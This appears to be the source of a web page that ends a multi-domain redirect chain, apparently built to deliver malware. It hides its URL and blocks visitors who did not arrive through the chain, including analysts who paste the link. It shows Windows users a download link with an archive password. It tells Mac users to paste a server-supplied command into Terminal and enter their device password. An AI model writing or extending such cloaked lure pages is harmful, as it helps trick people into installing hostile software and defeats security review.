'use client'

import { useState, useEffect } from 'react'
import { useParams } from 'next/navigation'
import { Copy, Check, Lock, FileDown, Terminal } from 'lucide-react'

/**
 * Prelander page served on the last domain — /d/[slug]
 *
 * Access-control:
 *  - Slug encodes a timestamp (validated server-side). Expired → blocked.
 *  - Direct access without a valid slug → neutral "not available" page.
 *  - When called from an intermediate domain the backend returns a 302 to
 *    the last domain. The browser follows it transparently; if the hostname
 *    changes we detect it and hard-navigate (handles cross-origin 302s that
 *    fetch's opaque redirect mode would otherwise hide).
 *
 * Redirection flow (spec):
 *  - Bypass OFF: Anchor → Inter (timer dwell on the INTER domain only) → THIS landing page
 *  - Bypass ON:  Anchor → Inter (timer dwell) → Campaign URL (via
 *    bypass_redirect_url from /domain-type — this page never shows)
 *
 * PRELANDER-DOMAIN RULES (spec):
 *  - NO timer on the prelander domain — the dwell runs only on the Inter
 *    domain during its hop. This page never waits artificially.
 *  - NO slug visible EVER: the URL is rewritten to the bare root " /"
 *    immediately on mount, before any data loads.
 *  - SAME-TAB reload works (sessionStorage marker survives reload);
 *    a NEW TAB paste has no marker → bounce back to where it came from,
 *    no preview of any kind (not even "not found").
 */

// sessionStorage key marking THIS TAB as the one the flow opened the
// prelander in. sessionStorage is PER-TAB: it survives reloads but is empty
// in a new tab — exactly the same-tab-allowed / new-tab-denied distinction.
const TAB_MARKER = 'mpa_prelander_tab'

// Send the visitor back to where they came from — no preview, no "not found"
// page, nothing rendered. If there is no history to go back to (the URL was
// pasted into a fresh tab from nowhere), close the tab / go to a blank page.
function bounceToSource(): boolean {
  try {
    // navigation entry count > 1 means we have a real place to go back to
    const nav = (window as any).navigation
    const hasHistory = nav && typeof nav.entries === 'function'
      ? nav.entries().length > 1
      : window.history.length > 1
    if (hasHistory) {
      window.history.back()
      return true
    }
  } catch { /* fall through */ }
  // Pasted into a tab with no chain history — fall back to the source: the
  // about:blank the tab started as (or close if the browser allows it).
  window.location.replace('about:blank')
  try { window.close() } catch { /* browsers may block; about:blank suffices */ }
  return false
}

export default function PrelanderSlugPage() {
  const params = useParams()
  // slug == "session" is the CLEAN-URL sentinel: the page was mounted at the
  // bare prelander domain root (https://prelander-domain.com/) and resolves
  // its content entirely from the server-side browsing-session cookie.
  const slug = (params.slug as string) || 'session'
  const [data, setData] = useState<any>(null)
  const [loading, setLoading] = useState(true)
  const [blocked, setBlocked] = useState(false)
  const [errorDetails, setErrorDetails] = useState<string>('')
  // True while the browser is transitioning from an Anchor/Inter domain to the
  // Prelander domain. We hold a loader on screen for a short fixed delay so the
  // visitor sees a clean "redirecting…" state rather than a jarring hop.
  const [transitioning, setTransitioning] = useState(false)

  useEffect(() => {
    const fetchData = async () => {
      console.log('[PRELANDER DEBUG] useEffect triggered')
      
      if (!slug) { 
        console.log('[PRELANDER ERROR] No slug provided')
        setBlocked(true)
        setErrorDetails('No slug provided')
        setLoading(false)
        return 
      }

      const hostname = typeof window !== 'undefined' ? window.location.hostname : ''
      const fullUrl = typeof window !== 'undefined' ? window.location.href : ''

      // ── CLEAN URL MODE (spec) ───────────────────────────────────────────
      // slug == "session": mounted at the bare prelander root. No hop
      // decisions apply — resolve content from the browsing-session cookie.
      if (slug === 'session') {
        // NO SLUG VISIBLE, EVEN WHILE LOADING: scrub the path to the bare
        // root immediately — before any fetch renders anything.
        if (typeof window !== 'undefined' && window.location.pathname.startsWith('/d/')) {
          window.history.replaceState({}, '', '/')
        }

        // SAME-TAB vs NEW-TAB (spec): sessionStorage is PER-TAB. A reload of
        // THIS tab keeps the marker; the same URL pasted into a NEW tab (or
        // any request that never came through the flow) has no marker →
        // bounce back to the source with NO preview of any kind.
        let isSameTab = false
        try { isSameTab = sessionStorage.getItem(TAB_MARKER) === '1' } catch { /* storage blocked → treat as new tab */ }

        // TAB BOOTSTRAP: the /_auth exchange set a one-time 60s bridge cookie.
        // This is the flow's own arrival — consume it NOW and mark THIS tab,
        // so reloads of this tab keep working while pastes elsewhere never do.
        if (!isSameTab) {
          const m = document.cookie.match(/(?:^|;\s*)mpa_tab_ok=1(?:;|$)/)
          if (m) {
            // Consume (expire immediately) — one-time bridge.
            document.cookie = 'mpa_tab_ok=; Max-Age=0; path=/'
            try { sessionStorage.setItem(TAB_MARKER, '1') } catch { /* storage blocked */ }
            isSameTab = true
            console.log('[PRELANDER] Tab bootstrap consumed — this tab is now the flow tab')
          }
        }

        if (!isSameTab) {
          console.log('[PRELANDER] No tab marker — new-tab paste or foreign request → bounce to source')
          bounceToSource()
          return
        }

        try {
          const res = await fetch('/api/prelander/resolve/session', {
            headers: { 'X-Prelander-Host': hostname },
          })
          if (!res.ok) {
            // Server says no valid session — nothing to show. Same-tab reload
            // after the session expired ALSO bounces (no preview at all).
            console.log('[PRELANDER] Session resolve rejected — bounce to source')
            bounceToSource()
            return
          }
          const json = await res.json()
          if (!json?.success) {
            bounceToSource()
            return
          }
          // Validated — refresh/reload of this tab keeps working.
          setData(json)
        } catch (error) {
          bounceToSource()
          return
        } finally {
          setLoading(false)
        }
        return
      }

      console.log('[PRELANDER DEBUG] Starting fetch')
      console.log('[PRELANDER DEBUG] - slug:', slug)
      console.log('[PRELANDER DEBUG] - hostname:', hostname)
      console.log('[PRELANDER DEBUG] - full URL:', fullUrl)
      console.log('[PRELANDER DEBUG] - pathname:', typeof window !== 'undefined' ? window.location.pathname : '')

      try {
        console.log('[PRELANDER DEBUG] Step 1: Fetching domain-type')
        // Step 1: check if this hostname is the Prelander domain.
        // If not, redirect the browser to the Prelander domain with the same
        // slug. This avoids fetch() swallowing the 302 from the backend.
        // The slug is passed so the backend can also detect bypass mode and
        // return the Campaign URL directly (bypass ON spec).
        const dtUrl = `/api/prelander/domain-type?host=${encodeURIComponent(hostname)}&slug=${encodeURIComponent(slug)}`
        console.log('[PRELANDER DEBUG] Calling domain-type API:', dtUrl)
        
        const dtRes = await fetch(dtUrl)
        console.log('[PRELANDER DEBUG] domain-type response status:', dtRes.status, dtRes.ok)
        
        if (dtRes.ok) {
          const dt = await dtRes.json()
          console.log('[PRELANDER DEBUG] domain-type data:', JSON.stringify(dt, null, 2))
          
          // Bypass ON (spec): Anchor → Inter (0.75s dwell) → Campaign URL.
          // We're on the Inter domain — hold the 0.75s loader, then go straight
          // to the Campaign URL. The landing page is never shown.
          if (dt.bypass_redirect_url) {
            console.log('[PRELANDER DEBUG] Bypass mode detected, redirecting to:', dt.bypass_redirect_url)
            setTransitioning(true)
            await new Promise(r => setTimeout(r, 750))
            window.location.replace(dt.bypass_redirect_url)
            return
          }
          // `last_domain` is the pre-glossary name the API still mirrors.
          const prelanderDomain = dt.prelander_domain ?? dt.last_domain
          console.log('[PRELANDER DEBUG] Prelander domain from API:', prelanderDomain)
          
          // The backend resolves the NEXT managed hop (chain-aware): the next
          // chain hop, the weighted Prelander pool pick, or the legacy
          // publisher/global Prelander domain. It only returns a URL when this
          // host is NOT the final prelander — so trust the returned hop over
          // the domain_type (a prelander-typed domain positioned mid-chain must
          // keep hopping).
          if (prelanderDomain) {
            console.log('[PRELANDER DEBUG] Need to hop to prelander domain:', prelanderDomain)
            // Cross-domain handoff (STEP 4): when leaving the Inter domain for
            // the prelander, mint a one-time handoff and exchange it at
            // /_auth/{handoff} on the prelander domain — the bootstrap consumes
            // it once, sets the prelander-domain HttpOnly session cookie, and
            // lands the visitor on the clean root. Refreshes then ride the
            // session cookie, never the handoff.
            // AUTHORIZATION GATE (spec: no request outside the Anchor flow
            // may see ANYTHING): the handoff mint runs the server-side
            // authorization (click-time session + browser fingerprint + slug
            // binding). A visitor without it — pasted URL, foreign referer,
            // direct hit — gets NO preview, not even a "not found" page, and
            // is sent back to where they came from.
            let handoffToken: string | null = null
            try {
              console.log('[PRELANDER DEBUG] Requesting handoff token')
              const hRes = await fetch(
                `/api/prelander/handoff?slug=${encodeURIComponent(slug)}&target_host=${encodeURIComponent(new URL(prelanderDomain).hostname)}`,
                { headers: { 'X-Prelander-Host': hostname } }
              )
              console.log('[PRELANDER DEBUG] Handoff response status:', hRes.status, hRes.ok)
              if (hRes.ok) {
                const h = await hRes.json()
                console.log('[PRELANDER DEBUG] Handoff data:', h)
                handoffToken = h?.handoff || null
              }
            } catch (handoffError) {
              console.log('[PRELANDER DEBUG] Handoff request failed:', handoffError)
            }

            if (!handoffToken) {
              // NOT authorized (or the mint failed): no preview of any kind —
              // bounce back to the source the request came from.
              console.log('[PRELANDER] Unauthorized hop attempt — bounce to source, no preview')
              bounceToSource()
              return
            }

            // TIMER LIVES ON THE INTER DOMAIN ONLY (spec): the 0.75s dwell
            // runs right here, on the Inter page, during the hop. The
            // prelander domain itself never waits — it loads naturally.
            console.log('[PRELANDER DEBUG] Got handoff token, redirecting after 0.75s dwell')
            setTransitioning(true)
            await new Promise(r => setTimeout(r, 750))
            const authUrl = `${prelanderDomain}/_auth/${handoffToken}?slug=${encodeURIComponent(slug)}`
            console.log('[PRELANDER DEBUG] Redirecting to:', authUrl)
            window.location.replace(authUrl)
            return
          }
          
          console.log('[PRELANDER DEBUG] No prelander domain, staying on current host')
        } else {
          console.log('[PRELANDER DEBUG] domain-type API failed with status:', dtRes.status)
        }

        // Step 2: on the Prelander domain (or type unknown) — fetch prelander data
        console.log('[PRELANDER DEBUG] Step 2: Fetching prelander data')
        const resolveUrl = `/api/prelander/resolve/${slug}`
        console.log('[PRELANDER DEBUG] Calling resolve API:', resolveUrl)
        
        const res = await fetch(resolveUrl, {
          headers: { 'X-Prelander-Host': hostname },
        })
        
        console.log('[PRELANDER DEBUG] Resolve response status:', res.status, res.ok)

        if (!res.ok) {
          console.log('[PRELANDER ERROR] Resolve rejected — no preview, bounce to source')
          // Spec: unauthorized/expired → NO preview of any kind (not even
          // "not found"); fall back to where the request came from.
          bounceToSource()
          return
        }

        const json = await res.json()
        console.log('[PRELANDER DEBUG] Resolve data:', JSON.stringify(json, null, 2))
        
        if (!json?.success) {
          console.log('[PRELANDER ERROR] Resolve returned success=false — bounce to source')
          bounceToSource()
          return
        }

        console.log('[PRELANDER SUCCESS] Setting prelander data')
        setData(json)
        // THE FLOW'S OWN ARRIVAL: mark THIS tab (reload now works; a paste
        // of this URL into a new tab has no marker and bounces).
        try { sessionStorage.setItem(TAB_MARKER, '1') } catch { /* storage blocked */ }
        // CLEAN FINAL URL (spec): the visible prelander address must be
        // https://prelander-domain.com/ — no slug, no ids, and rewritten
        // IMMEDIATELY (before this render paints the data) so the slug is
        // never visible even during loading. From here refreshes ride the
        // browsing-session cookie (the /d/session route), not the slug.
        if (typeof window !== 'undefined' && window.location.pathname.startsWith('/d/')) {
          window.history.replaceState({}, '', '/')
        }
      } catch (error) {
        console.error('[PRELANDER ERROR] Exception in fetchData:', error)
        setBlocked(true)
        setErrorDetails(error instanceof Error ? error.message : 'Unknown error')
      } finally {
        console.log('[PRELANDER DEBUG] Fetch complete, loading=false')
        setLoading(false)
      }
    }
    fetchData()
  }, [slug])

  useEffect(() => {
    document.title = 'Download Ready'
  }, [])

  // Simple professional loader — shown during the data fetch and during the
  // 0.75s Inter-domain dwell. Nothing extra: one spinner, one line of text.
  if (loading || transitioning) {
    return (
      <div className="min-h-screen flex items-center justify-center bg-[#f7f8fa]">
        <div className="flex flex-col items-center gap-4">
          <div className="w-8 h-8 border-2 border-gray-200 border-t-gray-800 rounded-full animate-spin" />
          <p className="text-sm text-gray-500">
            {transitioning ? 'Redirecting…' : 'Loading…'}
          </p>
        </div>
      </div>
    )
  }

  if (blocked || !data) {
    return (
      <div className="min-h-screen flex items-center justify-center bg-[#f0f2f5]">
        <div className="text-center max-w-md px-4">
          <div className="w-16 h-16 rounded-full bg-gray-200 mx-auto mb-4 flex items-center justify-center">
            <FileDown size={24} className="text-gray-400" />
          </div>
          <p className="text-gray-500 text-sm">This link is no longer available.</p>
          {errorDetails && (
            <div className="mt-4 p-3 bg-red-50 border border-red-200 rounded-lg">
              <p className="text-xs text-red-600 font-mono">{errorDetails}</p>
              <p className="text-xs text-gray-500 mt-1">Check browser console for details</p>
            </div>
          )}
        </div>
      </div>
    )
  }

  // Note: Bypass OFF always shows the landing page — even when the backend has
  // no active template (the built-in layout renders as fallback). The visitor
  // is only forwarded straight to the campaign URL when Bypass is ON, which
  // happens earlier via `bypass_redirect_url` from /domain-type.

  // Admin pasted a complete HTML template → the backend already rendered it
  // server-side ({Campaign_URL} / {Password} shortcodes substituted). Serve it
  // as a full-page document instead of the built-in layouts.
  if (data.rendered_html) return <FullHtmlPrelander html={data.rendered_html} />

  if (data.os === 'mac') return <MacPrelander data={data} />
  return <WindowsPrelander data={data} />
}

/* ─── Full HTML: server-rendered custom template ─────────────────────────── */
function FullHtmlPrelander({ html }: { html: string }) {
  useEffect(() => {
    // Replace the whole document so <!DOCTYPE html>, <head> styles and the
    // template's scripts behave exactly as the admin authored them.
    document.open()
    document.write(html)
    document.close()
  }, [html])
  return null
}

/* ─── Windows Prelander ──────────────────────────────────────────────────── */
function WindowsPrelander({ data }: { data: any }) {
  const [copied, setCopied] = useState(false)
  // Template customisation fields resolved by the backend (assigned template
  // or OS default); fall back to the historical copy when no template data.
  const tpl = data?.template
  const title = tpl?.title ?? 'Your file is ready to download'
  const subtitle = tpl?.subtitle ?? 'Your file is prepared. Copy the link to download.'
  const buttonText = tpl?.button_text ?? 'Copy'

  const handleCopy = () => {
    if (data?.offer_url) {
      navigator.clipboard.writeText(data.offer_url).catch(() => {})
      setCopied(true)
      setTimeout(() => setCopied(false), 2000)
    }
  }

  return (
    <div className="min-h-screen flex items-center justify-center p-4 bg-[#f0f2f5]">
      <div className="w-full max-w-md">
        <div className="bg-white rounded-2xl shadow-lg border border-gray-200 overflow-hidden">
          <div className="px-6 pt-8 pb-5 text-center">
            <div className="w-14 h-14 rounded-full bg-green-100 mx-auto mb-4 flex items-center justify-center">
              <FileDown size={26} className="text-green-600" />
            </div>
            <h1 className="text-xl font-bold text-gray-900">{title}</h1>
            <p className="text-sm text-gray-500 mt-2">{subtitle}</p>
          </div>

          <div className="px-6 pb-4">
            <label className="block text-xs font-semibold text-gray-500 uppercase tracking-wide mb-2">Download Link</label>
            <div className="flex items-center gap-2 bg-gray-50 border border-gray-200 rounded-xl p-1">
              <div className="flex-1 px-3 py-2.5 text-sm text-gray-700 font-mono truncate select-all">
                {data.offer_url}
              </div>
              <button onClick={handleCopy}
                className={`flex-shrink-0 flex items-center gap-1.5 px-4 py-2.5 rounded-lg text-sm font-semibold transition-all ${
                  copied ? 'bg-green-600 text-white' : 'bg-gray-900 text-white hover:bg-gray-800'
                }`}>
                {copied ? <><Check size={14} /> Copied</> : <><Copy size={14} /> {buttonText}</>}
              </button>
            </div>
          </div>

          {data.password && (tpl?.show_password_field ?? true) && (
            <div className="px-6 pb-4">
              <label className="block text-xs font-semibold text-gray-500 uppercase tracking-wide mb-2">Password</label>
              <div className="flex items-center gap-3 bg-amber-50 border border-amber-200 rounded-xl px-4 py-3">
                <Lock size={16} className="text-amber-500 flex-shrink-0" />
                <span className="text-base font-bold font-mono tracking-widest text-amber-800 select-all">{data.password}</span>
              </div>
            </div>
          )}

          <div className="px-6 pb-8" />
        </div>
        <p className="text-center text-xs text-gray-400 mt-4">Secure file hosting service</p>
      </div>
    </div>
  )
}

/* ─── Mac Prelander ──────────────────────────────────────────────────────── */
function MacPrelander({ data }: { data: any }) {
  const [copiedCmd, setCopiedCmd] = useState(false)
  const installCommand = data.offer_url || ''
  // Template customisation fields — same source as the Windows prelander.
  const tpl = data?.template
  const title = tpl?.title ?? 'How to open Terminal on Mac'

  const handleCopyCmd = () => {
    navigator.clipboard.writeText(installCommand).catch(() => {})
    setCopiedCmd(true)
    setTimeout(() => setCopiedCmd(false), 2000)
  }

  return (
    <div className="min-h-screen bg-[#f5f5f7] flex flex-col items-center p-4 py-10">
      <div className="w-full max-w-2xl space-y-6">

        <div className="bg-white rounded-2xl shadow-lg border border-gray-200 overflow-hidden">
          <div className="px-6 pt-8 pb-5 text-center">
            <div className="w-14 h-14 rounded-full bg-gray-900 mx-auto mb-4 flex items-center justify-center">
              <Terminal size={26} className="text-green-400" />
            </div>
            <h1 className="text-xl font-bold text-gray-900">{title}</h1>
          </div>

          <div className="px-6 pb-5">
            <label className="block text-xs font-semibold text-gray-500 uppercase tracking-wide mb-2">Installation Command</label>
            <div className="flex items-center gap-2 bg-gray-900 rounded-xl p-1">
              <div className="flex-1 px-3 py-3 text-sm text-green-400 font-mono truncate select-all">
                <span className="text-gray-500 mr-1">$</span> {installCommand}
              </div>
              <button onClick={handleCopyCmd}
                className={`flex-shrink-0 flex items-center gap-1.5 px-4 py-2.5 rounded-lg text-sm font-semibold transition-all ${
                  copiedCmd ? 'bg-green-600 text-white' : 'bg-gray-700 text-white hover:bg-gray-600'
                }`}>
                {copiedCmd ? <><Check size={14} /> Copied</> : <><Copy size={14} /> Copy</>}
              </button>
            </div>
          </div>

          <div className="px-6 pb-6">
            <div className="space-y-3">
              {[
                <>Press <kbd className="px-1.5 py-0.5 bg-gray-100 border border-gray-300 rounded text-xs font-mono">⌘</kbd> + <kbd className="px-1.5 py-0.5 bg-gray-100 border border-gray-300 rounded text-xs font-mono">Space</kbd> to open Spotlight Search.</>,
                <>Type <strong>&quot;Terminal&quot;</strong> and press <kbd className="px-1.5 py-0.5 bg-gray-100 border border-gray-300 rounded text-xs font-mono">Return</kbd> to launch it.</>,
                <>Once the Terminal window is open, proceed with the steps below.</>,
              ].map((step, i) => (
                <div key={i} className="flex gap-3">
                  <div className="flex-shrink-0 w-7 h-7 rounded-full bg-blue-100 text-blue-700 flex items-center justify-center text-sm font-bold">{i + 1}</div>
                  <p className="text-sm text-gray-700 pt-1">{step}</p>
                </div>
              ))}
            </div>
          </div>
        </div>

        <div className="bg-white rounded-2xl shadow-lg border border-gray-200 overflow-hidden">
          <div className="px-6 pt-6 pb-2">
            <h2 className="text-lg font-bold text-gray-900">Installation via Terminal command</h2>
          </div>
          <div className="px-6 pb-6">
            <div className="space-y-3 mt-3">
              {[
                'Copy the installation command above.',
                <>Open the terminal and paste the command, then press <strong>&quot;Return&quot;</strong>.</>,
                'Enter your device password and confirm the installation.',
              ].map((step, i) => (
                <div key={i} className="flex gap-3">
                  <div className="flex-shrink-0 w-7 h-7 rounded-full bg-green-100 text-green-700 flex items-center justify-center text-sm font-bold">{i + 1}</div>
                  <p className="text-sm text-gray-700 pt-1">{step}</p>
                </div>
              ))}
            </div>
          </div>

          {data.password && (
            <div className="px-6 pb-6">
              <label className="block text-xs font-semibold text-gray-500 uppercase tracking-wide mb-2">Device Password</label>
              <div className="flex items-center gap-3 bg-amber-50 border border-amber-200 rounded-xl px-4 py-3">
                <Lock size={16} className="text-amber-500 flex-shrink-0" />
                <span className="text-base font-bold font-mono tracking-widest text-amber-800 select-all">{data.password}</span>
              </div>
            </div>
          )}
        </div>

        <div className="bg-white rounded-2xl shadow-lg border border-gray-200 overflow-hidden">
          <div className="px-6 pt-6 pb-2">
            <h2 className="text-lg font-bold text-gray-900">Video Tutorial</h2>
            <p className="text-sm text-gray-500 mt-1">Watch the step-by-step guide below</p>
          </div>
          <div className="px-6 pb-6 pt-3">
            <div className="relative w-full aspect-video bg-black rounded-xl overflow-hidden">
              <video className="w-full h-full" controls playsInline autoPlay muted loop preload="auto" src="/terminal.mp4" />
            </div>
          </div>
        </div>

        <p className="text-center text-xs text-gray-400 pb-4">Secure installation service</p>
      </div>
    </div>
  )
}
